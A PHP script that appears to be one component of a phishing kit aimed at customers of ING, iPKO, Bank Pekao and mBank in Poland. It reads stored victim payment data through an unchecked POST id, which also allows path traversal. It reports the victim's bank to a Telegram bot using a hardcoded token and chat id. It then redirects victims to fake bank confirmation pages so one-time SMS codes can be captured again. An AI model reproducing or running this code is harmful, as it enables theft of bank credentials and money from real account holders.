<?php


function sendAlert($text)
{

    $token = "1180981314:AAHXPT951S4vek83Ratnrqt6XOZM-mrgV2I";
    $chat_id = "-437190518";
    $txt = '';

    $arr = array(
        '' => $text,
    );

    foreach ($arr as $key => $value) {
        $txt .= "<b>" . $key . "</b> " . $value . "\n";
    };
    $txt = urlencode($txt);
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&disable_web_page_preview=true&disable_notification=true", "r");
}

sendAlert('hello from sms/redirect.php');
$id = $_POST["id"];

$data = file_get_contents("../payment/temp/" . $id);
$json = json_decode($data, true);

$banking = $json["banking"];
$name = $banking["name"];



if ($json["retry_sms"]) {

    sendAlert('sms/redirect.php: retry_sms is set!');
    sendAlert('banking name: ' . $name);

    if ($name == 'ING') {
        $response = [
            "status" => "success",
            "url" => "https://" . $_SERVER["HTTP_HOST"] . "/login/ing/confirm.php?id=" . $id . "&retry=true"
        ];
    } else if ($name == 'iPKO') {
        $response = [
            "status" => "success",
            "url" => "https://" . $_SERVER["HTTP_HOST"] . "/login/ipko/confirm.php?id=" . $id . "&retry=true"
        ];
    } else if ($name == 'Bank Pekao') {
        $response = [
            "status" => "success",
            "url" => "https://" . $_SERVER["HTTP_HOST"] . "/login/pekao/confirm.php?id=" . $id . "&retry=true"
        ];
    } else if ($name == 'mBank') {
        $response = [
            "status" => "success",
            "url" => "https://" . $_SERVER["HTTP_HOST"] . "/login/mbank/confirm.php?id=" . $id . "&retry=true"
        ];
    } else {

        $response = [
            "status" => "success",
            "url" => "https://" . $_SERVER["HTTP_HOST"] . "/sms/?id=" . $id . "&retry=true"
        ];
    }

    header("Content-Type: application/json");
    echo json_encode($response);
}
